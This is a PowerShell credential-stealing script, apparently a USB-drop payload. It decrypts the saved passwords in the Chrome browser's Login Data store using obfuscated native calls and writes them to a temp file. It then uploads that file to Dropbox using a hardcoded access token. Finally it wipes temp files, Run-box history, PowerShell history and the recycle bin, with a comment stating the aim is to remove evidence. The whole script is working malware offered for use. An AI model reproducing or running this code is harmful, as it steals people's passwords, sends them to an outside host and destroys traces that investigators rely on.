$DropBoxAccessToken = "sl.u.AGDOVHUsFmWrryLoP-unYluIUDImr38HWSTLxuSNd2SNYDhOUJl0rIApRGm_bREbJYgGD3ygtzwG_ssZZbNktIOlkofBbknBdWk-ZD4oNfc4Y6h4qImTEJXcL0P-bUgG8Y1QOwDj159JqJDj2x6XCealy8ZRJ13eVnxE_XspIAdthHP99sBvRFG_OmKjL_OrDGm10-nYYyvg5TFponBMulUoZ0zNBhQGoaHG1B1hXIoBj6w_fUETqza9mVN-aq50j5Ex0rykhConNWCUEgX-Q0njLQORwYr8RoXzdKJrg1SAFcGOOmpFuj36HjIY_eWVFcZt16VBCMvsFWutP3W5eZQYiH9X0Hqim3gBkn_9A-9pflJrSUA5VI-LRTX0Gesy8Yp3476ankigLnYAA7ewDIWIOGmjx7uKO96C5Ac6o2W6GN0g9w3KLIe-zz4qrGFN2oViJA2z0D2VPc3irVm3s_gassheSn9LSVQNvvTMUSDtEKYAb1FiQuEg4oqYa08haTyC9S_FbYXm68BiP1-m1PghISduafBBfAAINJy6vT2YEeZFmwSdFmfSfch6osDeJkVCl-2F5JHBYZRiNl4_E6L_EG996GjRkFRJFlFdMCvFB5yWGqLaj27R8nGx0o5pALypeL3ACjPj-0MUKwH0Eju86h-mvKmxrwVw5LoaXTumOIX1vxAJTpw2L0sIJbYCSuhCd3tZB3nSz5aQjMIl1sZxYYKIsnQSX7kSeD7txMMEgYdstGY1w25zTxX7mDKPQnJtzZmYc7iDl8Wu3uJ1XVTzCABPhcEpwTDJmNBsp-Ml7WYDHF9jlADRPItS04r-swIpJdExkwF3dTXdGx2Z6R3yJLrGuRf8OK_ZrpRpgjIY0x9RQATBFRmd1k5FBIWBDNVHIyFfAxAXiyMMhUhvBm9ttjg0pCIeahdWizV0XhL4qeLlclKT1lgmszD1Mw6uIuJu9K5fmntDdM4-WLRr2G-v-R1serHTqu9n1Ue4fy-eyrZCpBvAP1YQ9szlWuPkQ_TDSk8QvWnPYi7-AoJNh06kMgWEBzXryiMrKzXduHW17SPNXeZCCY8Kbd0ASeoRPNsBOR7_SB0L_F9vkygIUwBfzNKhZeQs92C7WaPtaLhoIi2FvRihqej0QNV81r7gjVH2BSmISkwk944g73994qkRef9uj5aoXSOjrT8qkCpO_Ku0C86lRuq03iCTk-yI-XhXTvlPCWUwrp5IXg5TyD8QcdGOBru6-J3BQBPsKwH8o9gSLZFj8hbVZvXVmAAok5h_kXkz7e2adG9jspfZlscFhm3-tPptBdBoMT--ZUYRnLV7nFzqC4I9kgadVJfJEOvAPEjX8oNYTknk_fc6qRyyWPKjjSxTAjpLpNjWHP04jICuuXuY6M4hLaqhg4QnmAc8AC0xPki0Qy74yCUc_Dde1hAutdfA5HmO43tW683XBQ"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#Stage 1 Obtain the credentials from the Chrome browsers User Data folder

#First we Kill Chrome just to be safe
Stop-Process -Name Chrome

$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
$u=[Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
$l=@()
if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
$c=[W]::B($s,5)
try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
$e=[byte[]]::new($k-31)
$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
#After Decrypting the contents of the files, save them to a file in the temp folder.

echo $l >> $env:TMP\$FileName

#Start Chrome again

$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
Start-Process -FilePath $pathToChrome

#Stage 2 Upload them to Dropbox

<#
.NOTES 
	This is to upload your files to dropbox
#>

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers


#Stage 3 Cleanup Traces

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
